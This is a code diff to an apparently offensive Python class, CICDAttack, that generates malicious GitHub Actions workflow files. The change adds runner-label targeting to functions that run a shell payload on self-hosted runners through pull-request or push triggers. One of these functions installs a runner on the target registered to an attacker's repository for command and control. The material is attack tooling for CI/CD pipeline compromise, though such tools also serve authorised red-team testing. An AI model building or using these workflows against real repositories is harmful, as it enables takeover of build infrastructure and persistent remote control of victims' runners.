@@ -8,7 +8,8 @@ class CICDAttack():
     """
 
     @staticmethod
-    def create_malicious_yml(payload: str, workflow_name: str = 'Testing'):
+    def create_malicious_yml(payload: str, workflow_name: str = 'Testing',
+                             runner_labels: list = None):
         """Creates a malicious YML file containing a shell execution payload
         that will run on the self hosted runner.
 
@@ -18,6 +19,8 @@ class CICDAttack():
             workflow_name (str, optional): Name of the self-hosted
             workflow that will require approval by default on
             fork pull request repositories. Default 'Testing'.
+            runner_labels (list, optional): Labels for runs-on targeting.
+            Defaults to ['self-hosted'].
 
         Returns:
             str: Workflow yaml file containing simple payload.
@@ -28,7 +31,7 @@ class CICDAttack():
         yaml_file['on'] = ['pull_request']
 
         test_job = {
-            'runs-on': ['self-hosted'],
+            'runs-on': runner_labels or ['self-hosted'],
             'steps': [
                 {
                     'name': 'Run Tests',
@@ -41,13 +44,16 @@ class CICDAttack():
         return yaml.dump(yaml_file, sort_keys=False)
 
     @staticmethod
-    def create_push_yml(payload: str, branch_name: str):
+    def create_push_yml(payload: str, branch_name: str,
+                        runner_labels: list = None):
         """Create a malicious yaml file that will trigger on push to a
         specific branch.
 
         Args:
             payload (str): Command to be executed as part of the 'run' payload.
             branch_name (str): Name of the branch for on: push trigger.
+            runner_labels (list, optional): Labels for runs-on targeting.
+            Defaults to ['self-hosted'].
 
         Returns:
             str: Workflow yaml file containing the payload.
@@ -58,7 +64,7 @@ class CICDAttack():
         yaml_file['on'] = {'push': {"branches": branch_name}}
 
         test_job = {
-            'runs-on': ['self-hosted'],
+            'runs-on': runner_labels or ['self-hosted'],
             'steps': [
                 {
                     'name': 'Run Tests',
@@ -123,7 +129,8 @@ class CICDAttack():
 
     @staticmethod
     def create_ror_yml(registration_token: str, attacker_repo: str,
-                       runner_version: str, branch_name: str):
+                       runner_version: str, branch_name: str,
+                       runner_labels: list = None):
         """Create a workflow that installs a GitHub Actions runner on the
         target, registered to the attacker's repo for C2.
 
@@ -132,6 +139,8 @@ class CICDAttack():
             attacker_repo (str): Attacker repo in org/repo format.
             runner_version (str): Runner release version (e.g. '2.321.0').
             branch_name (str): Branch for on:push trigger.
+            runner_labels (list, optional): Labels for runs-on targeting.
+            Defaults to ['self-hosted'].
 
         Returns:
             str: Workflow YAML contents.
@@ -163,7 +172,8 @@ class CICDAttack():
             'echo "RoR runner installed: $RUNNER_NAME"'
         )
 
-        return CICDAttack.create_push_yml(payload, branch_name)
+        return CICDAttack.create_push_yml(payload, branch_name,
+                                          runner_labels=runner_labels)
 
     @staticmethod
     def create_c2_dispatch_yml():
